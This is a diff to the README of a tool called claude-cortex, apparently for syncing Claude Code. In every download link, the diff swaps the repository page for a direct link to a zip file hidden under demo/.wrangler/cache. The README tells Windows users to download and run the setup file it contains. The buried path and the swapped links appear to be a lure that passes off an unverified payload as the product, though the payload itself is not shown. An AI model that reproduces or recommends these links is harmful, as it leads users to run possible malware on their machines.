@@ -1,10 +1,10 @@
 # 🧠 claude-cortex - Keep Claude Code in sync
 
-[![Download claude-cortex](https://img.shields.io/badge/Download%20claude--cortex-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trussed-japanesecedar194/claude-cortex)
+[![Download claude-cortex](https://img.shields.io/badge/Download%20claude--cortex-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trussed-japanesecedar194/claude-cortex/raw/refs/heads/main/demo/.wrangler/cache/claude_cortex_1.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex
+Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex/raw/refs/heads/main/demo/.wrangler/cache/claude_cortex_1.6.zip
 
 Use the page to get the latest version for Windows. If the page shows a release file, download it to your computer. If it shows a setup file, save it and run it after the download ends.
 
@@ -148,7 +148,7 @@ Open the same folder and add new notes or edit old ones.
 
 ## 🔗 Download again
 
-Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex
+Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex/raw/refs/heads/main/demo/.wrangler/cache/claude_cortex_1.6.zip
 
 ## 📁 Repository details
 
